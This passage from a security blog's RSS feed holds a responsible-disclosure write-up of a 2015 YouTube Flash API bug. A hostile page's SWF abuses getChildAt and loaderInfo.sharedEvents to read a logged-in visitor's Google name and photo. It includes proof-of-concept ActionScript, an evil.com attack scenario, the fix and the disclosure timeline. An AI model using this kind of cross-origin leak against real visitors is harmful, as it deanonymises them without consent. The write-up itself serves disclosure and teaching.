+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube-part-2%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">53</post-id>	</item>
+		<item>
+		<title>Advanced Flash Vulnerabilities in Youtube &#8211; Part 1</title>
+		<link>/2017/08/advanced-flash-vulnerabilities-in-youtube/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=advanced-flash-vulnerabilities-in-youtube</link>
+					<comments>/2017/08/advanced-flash-vulnerabilities-in-youtube/#comments</comments>
+		
+		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
+		<pubDate>Fri, 25 Aug 2017 10:26:45 +0000</pubDate>
+				<category><![CDATA[Flash]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[Youtube]]></category>
+		<guid isPermaLink="false">/?p=8</guid>
+
+					<description><![CDATA[Why Flash Security still matters? Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn&#8217;t have the time to report or that&#8230; <a class="read-more" href="/2017/08/advanced-flash-vulnerabilities-in-youtube/">Read More</a>]]></description>
+										<content:encoded><![CDATA[<h3>Why Flash Security still matters?</h3>
+<p><img loading="lazy" class="alignnone wp-image-147 size-medium" style="display: none;" src="/wp-content/uploads/2017/08/Youtube-Flash-Api-1.png" alt="" width="1" height="1" />Flash is still an active threat. In 2017, I reported Flash vulnerabilities to Facebook, Youtube, WordPress, Yahoo, Paypal and Stripe. Over the last 3 years, I reported more than 50 Flash vulnerabilities to Bug Bounty programs. And there are many more I didn&#8217;t have the time to report or that weren&#8217;t fixed after I reported it.</p>
+<p><img loading="lazy" class="size-medium wp-image-73 aligncenter" src="/wp-content/uploads/2017/08/1uureg-300x184.jpg" alt="" width="300" height="184" srcset="/wp-content/uploads/2017/08/1uureg-300x184.jpg 300w, /wp-content/uploads/2017/08/1uureg.jpg 450w" sizes="(max-width: 300px) 100vw, 300px" /><br />
+In addition, Flash has been replaced by new javascript/html5 features. These features introduce complexity and new kind of vulnerabilities like bad CORS implementation, DOM XSSes triggered by postMessage or XHR requests, active mixed content&#8230; Learning from Flash mistakes can help design and implement more secure javascript applications. The new Youtube html5 Api is mostly a porting of the Youtube Flash Api to javascript, making it interesting to study. In fact, I was able to find XSSes in the Youtube html5 Api using my knowledge of the Flash Api.<br />
+I&#8217;ll explain some advanced Flash vulnerabilities I found in Youtube Flash Api and in the process I will draw a parallel with html/javascript security. This is quite technical so feel free to comment or to tweet me (<a href="https://twitter.com/opnsec" target="_blank" rel="noopener noreferrer">@opnsec</a>) if something is not clear or if you want to add something. You can also read more about Flash security model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
+<h2>Reverse engineering Youtube Flash Api</h2>
+<p>Youtube Flash Api allows developers to embed a Youtube video in an external website.<br />
+Here is the workflow of the Api:</p>
+<p><a href="/wp-content/uploads/2017/08/Diagramme1.svg" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="aligncenter wp-image-11" src="/wp-content/uploads/2017/08/Diagramme1.svg" alt="" width="982" height="468" /></a></p>
+<p>The entry point, Youtube Wrapper, is a Flash file located at youtube.com/v/[VIDEO_ID], it is just a wrapper between the HTML page and the Main App.<br />
+The Main Application is a large flash file of about 100k LoC and is located in a sandboxed domain s.ytimg.com.<br />
+The Modules handle optional functions like subtitles or advertisements. They are not stand-alone Flash files and can only be loaded by the Main App.</p>
+<p>In addition there is a Flash to Javascript Api that allows the html page to send commands to the Youtube Api like play(), pause(), etc&#8230; Flash files will also perform &#8220;ajax style&#8221; cross-domain requests to load configuration files and video data.</p>
+<h2>I. User info leakage</h2>
+<p>Let&#8217;s start with a simple vulnerability. Here is a simplified version of Youtube Wrapper code in Flash ActionScript3 (AS3) :</p>
+<pre><code >public class YoutubeWrapper extends Sprite{</p>
+<p>private var user_name = "The Victim";<br />
+private var user_picture = "https://googleusercontent.com/.../victim_photo.jpg";<br />
+private var appLoader = new Loader();</p>
+<p>public function YoutubeWrapper(){<br />
+// allow external javascript/Flash files to access its public properties<br />
+Security.allowDomain("*");<br />
+// load the Main App<br />
+this.appLoader .load(new URLRequest("https://s.ytimg.com/.../watch_as3.swf");<br />
+// add as child of display container<br />
+this.addChild(this.appLoader );<br />
+// loaderInfo.sharedEvents Api<br />
+this.loader.contentLoaderInfo.sharedEvents<br />
+.addEventListener("REQUEST_USERINFO", this.onRequestUserinfo);<br />
+}<br />
+private function onRequestUserinfo(event:Event){<br />
+// write the user info into the event.data property<br />
+// which is accessible to the sharedEvents caller<br />
+event.data.user_name = this.user_name;<br />
+event.data.user_image = this.user_image;<br />
+}<br />
+}</code></pre>
+<p>Youtube Wrapper is generated on the fly and its property &#8220;user_name&#8221; contains the Google user name (if he is connected to Google). The property &#8220;user_picture&#8221; contains the link to the user profile picture. In this bug, the attacker will steal these values.</p>
+<p>Youtube Wrapper can be loaded from the developer own Flash file (let&#8217;s call it Evil Wrapper). In that case, they both executes in a different Flash security sandbox.</p>
+<blockquote><p>Loading an external Flash file in Flash is a little bit similar to loading an &lt;iframe&gt; in html. If the iframe is from a different origin than its parent, they cannot access each other properties due to the Same-Origin Policy (SOP)</p></blockquote>
+<p>Youtube Wrapper contains the code <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()" target="_blank" rel="noopener noreferrer">Security.allowDomain(&#8220;*&#8221;)</a> to allow javascript on the hosting webpage to send commands to the Flash app like play(), pause(),etc&#8230; This also means that Evil Wrapper can access any public property of Youtube Wrapper as if it was in the same Security sandbox. However it cannot access private properties.</p>
+<p>The user_name property is private so Evil Wrapper cannot access it.</p>
+<p>Flash also provides an Api for communication between a Loader and a loaded file using <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/LoaderInfo.html#sharedEvents" target="_blank" rel="noopener noreferrer">loaderInfo.sharedEvents</a>. Youtube Wrapper uses this api to communicate with the Main App. When the Main App dispatches an event to the sharedEvents Api, the Youtube Wrapper receives the event and send back the user info using the event.data property.<br />
+loaderInfo.sharedEvents is not only accessible to the loader and the loaded files, but also to any Flash file that has a reference to this loaderInfo object.</p>
+<blockquote><p>This is similar to the javascript <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener noreferrer">postMessage Api </a>which allows communication between cross-domain iframes. The postMessage Api is accessible not only to the iframe and its parent but also to any other window that has a reference to the iframe or the parent. Any arbitrary domain can access these references using window.open and window.frames, which are not restricted by the SOP.</p></blockquote>
+<p>If Evil loader can access this particular loaderInfo object it will be able to send an event to the Youtube Wrapper and steal the user info.<br />
+loaderInfo is a property of appLoader which is a private property of the Youtube Wrapper, so Evil Wrapper cannot access it.</p>
+<p>However, when using a Loader, if you want to display the loaded file, you have to add it as a child of the Display Container. This is usually done using<br />
+this.<a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#addChild()" target="_blank" rel="noopener noreferrer">addChild</a>(this.loader); and this is exactly what the Youtube Wrapper does.<br />
+The thing is that the Youtube Wrapper also have a built-in public method <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/DisplayObjectContainer.html#getChildAt()" target="_blank" rel="noopener noreferrer">getChildAt</a>() that will return the children of the Youtube Wrapper. This means that Evil Wrapper can call YoutubeWrapper.getChildAt(0) which will return the loader object, bypassing the privacy of the loader property.</p>
+<blockquote><p>Setting a property as &#8220;private&#8221; is called <a href="https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)" target="_blank" rel="noopener noreferrer">encapsulation</a>. However, only the reference is private, not the object the reference points to.</p></blockquote>
+<p>From there Evil Wrapper can access YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents which is the interface between Youtube Wrapper and the Main App. Evil Wrapper can send an event to the Youtube Wrapper, the Youtube Wrapper will provide the user info in the event.data property and Evil Wrapper can then read the event.data value.<br />
+Proof of Concept :</p>
+<p>Evil Wrapper code was like this</p>
+<pre><code >var loader = new Loader();<br />
+// Load the Youtube Wrapper<br />
+loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));<br />
+var youtubeWrapper = loader.content;<br />
+// Access the Youtube Wrapper appLoader object<br />
+var appLoader = youtubeWrapper.getChildAt(0);<br />
+// Access the loaderInfo.sharedEvents of appLoader<br />
+var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;</p>
+<p>// Prepare the event to send to Youtube Wrapper<br />
+var leakEvent = new Event("Request_username");<br />
+leakEvent.data = new Object();<br />
+// Send the leakEvent to the LeakingSharedEvents<br />
+LeakingSharedEvents.dispatchEvent(leakEvent);</p>
+<p>// The username is now accessible in the event.data property<br />
+trace(leakEvent.data.user_name);<br />
+trace(leakEvent.data.user_picture);</code></pre>
+<p>POC workflow :</p>
+<p><img loading="lazy" class="wp-image-40 aligncenter" src="/wp-content/uploads/2017/08/Diagramme2.svg" alt="" width="800" height="287" /><br />
+Attack scenario:<br />
+Prerequisite: The victim is logged in Google and have Flash player<br />
+(1) The victim visits the attacker webpage evil.com/evil.html which contains a Flash object evil.com/evil.swf<br />
+(2) evil.swf loads Youtube wrapper (https://www.youtube.com/v/[VIDEO_ID]) and retrieves the user Google username (4-5-6)<br />
+evil.com now knows the username of it&#8217;s visitors. In addition, as the profile picture link is unique, it is possible to uniquely identify the user&#8217;s Google account.</p>
+<p>Impact:<br />
+Any website could use this to know the identity of it&#8217;s users, if they are connected to Google. Imagine how you would feel if you visit a random website and this website displays your name and your picture!</p>
+<p>Mitigation:<br />
+To resolve this issue, Youtube Wrapper stopped writing the user info in the event.data property and instead sends it directly to the Main App. That way even if Evil Wrapper sends an event to Youtube Wrapper, it wouldn&#8217;t receive the user info as it would be directly sent to the Main App.</p>
+<p>Timeline:<br />
+08/27/2015 &#8211; reported to Google VRP<br />
+09/09/2015 &#8211; issue fixed and reward <img loading="lazy" class="alignnone wp-image-44 size-full" src="/wp-content/uploads/2017/08/1-star.png" alt="" width="60" height="14" /><br />
+This was a simple bug and I hope it helps you understand the basic challenges here. You can read about another bug where we actually execute arbitrary Flash code in youtube.com in <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/"><strong>Part 2</strong></a>.</p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2017/08/advanced-flash-vulnerabilities-in-youtube/feed/</wfw:commentRss>
+			<slash:comments>7</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">8</post-id>	</item>
+	</channel>
+</rss>
